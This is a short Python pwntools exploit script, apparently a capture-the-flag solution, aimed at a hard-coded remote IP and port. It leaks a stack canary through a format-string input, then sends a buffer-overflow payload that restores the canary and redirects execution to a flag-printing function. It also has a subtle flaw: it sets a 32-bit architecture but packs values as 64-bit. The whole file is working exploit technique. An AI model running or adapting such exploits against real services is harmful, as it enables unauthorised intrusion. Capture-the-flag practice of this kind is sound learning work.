from pwn import *
import re

context.log_level = 'debug'
context.arch = 'i386'

HOST = "178.216.122.15"
PORT = 43466

GIVE_FLAG_ADDR = 0x080491a6  

def exploit():
    p = remote(HOST, PORT)
   
    p.recvuntil(b"name: ")
    p.sendline(b"%39$p")  

    data = p.recvuntil(b"Enter your message: ").decode()
    log.info(f"Received data: {data}")
    
    match = re.search(r'0x([a-fA-F0-9]{8})', data)
    if match:
        canary_str = match.group(0)
        log.info(f"Extracted canary string: {canary_str}")
        
        try:
            canary = int(canary_str, 16)
            log.success(f"Canary found: 0x{canary:x}")

            payload = b'A' * 64      
            payload += p64(canary)   
            payload += b'B' * 8      
            payload += p64(GIVE_FLAG_ADDR)  
            
            p.sendline(payload)
            
            try:
                flag = p.recvall(timeout=2).decode()
                log.success(f"Flag captured: {flag}")
            except:
                log.info("Trying interactive mode...")
                p.interactive()
                
            return
            
        except ValueError:
            log.error("Invalid hex value for canary")
    else:
        log.error("Could not find hex pattern in the response")
    
    p.close()

if __name__ == "__main__":
    exploit()